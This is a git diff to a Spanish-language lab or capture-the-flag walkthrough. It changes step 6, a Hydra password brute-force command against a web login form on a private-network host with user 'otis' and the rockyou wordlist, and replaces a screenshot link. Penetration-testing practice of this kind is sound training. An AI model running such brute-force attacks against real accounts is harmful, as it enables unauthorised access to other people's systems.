@@ -83,9 +83,9 @@ URL completa: `http://192.168.1.10/news/admin/`
 - *Paso 6:* Aplicar fuerza bruta a inicio de sesión con Hydra.
 
 ```
-hydra -l otis -P /usr/share/wordlists/rockyou.txt "http-post-form://192.168.1.10/webmail/src/redirect.php:login_username=^USER^&secretkey=^PASS^&js_autodetect_results=1&just_logged_in=1:Unknown user or password incorrect."
+hydra -l otis -P /usr/share/wordlists/rockyou.txt 192.168.1.10 http-post-form "/monitoring/index.php:username=^USER^&password=^PASS^:Password"
 ```
-![11](https://user-images.githubusercontent.com/75953873/177061160-81bd988d-c16b-4df4-a628-b2fdd41a1775.png)
+![12](https://user-images.githubusercontent.com/75953873/177061649-80af992e-4472-4625-bf57-460e7bd74773.png)
 
 Usuario: `otis`
 
